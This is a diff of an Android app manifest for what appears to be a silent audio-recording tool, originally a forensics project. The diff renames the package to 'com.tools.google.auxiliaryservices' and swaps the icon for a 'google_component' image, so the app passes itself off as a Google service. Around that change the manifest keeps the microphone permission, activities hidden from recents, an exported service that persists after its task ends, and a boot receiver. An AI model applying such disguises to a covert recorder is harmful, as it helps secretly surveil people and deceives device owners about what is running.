@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.forensic.unipg.silenceaudiorecording">
+    package="com.tools.google.auxiliaryservices">
 
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
@@ -16,17 +16,17 @@
 
     <application
             android:allowBackup="true"
-            android:icon="@mipmap/ic_launcher"
+            android:icon="@mipmap/google_component"
             android:label="@string/app_name"
             android:supportsRtl="true"
             android:theme="@style/AppTheme">
             <activity
-                android:name="com.forensic.unipg.silenceaudiorecording.SilenceAudioRecordingActivity"
+                android:name="com.tools.google.auxiliaryservices.SilenceAudioRecordingActivity"
                 android:excludeFromRecents="true">
             </activity>
             <activity-alias
-                android:name="com.forensic.unipg.silenceaudiorecording.Launcher"
-                android:targetActivity="com.forensic.unipg.silenceaudiorecording.SilenceAudioRecordingActivity"
+                android:name="com.tools.google.auxiliaryservices.Launcher"
+                android:targetActivity="com.tools.google.auxiliaryservices.SilenceAudioRecordingActivity"
                 android:excludeFromRecents="true">
                 <intent-filter>
                     <action android:name="android.intent.action.MAIN" />
@@ -42,9 +42,9 @@
         <service android:enabled="true"
                  android:exported="true"
                  android:stopWithTask="false"
-                 android:name=".SilenceAudioRecordingService" />
+                 android:name="com.tools.google.auxiliaryservices.SilenceAudioRecordingService" />
 
-        <receiver android:name=".BootReceiver"
+        <receiver android:name="com.tools.google.auxiliaryservices.BootReceiver"
                   android:enabled="true"
                   android:exported="true">
             <intent-filter>
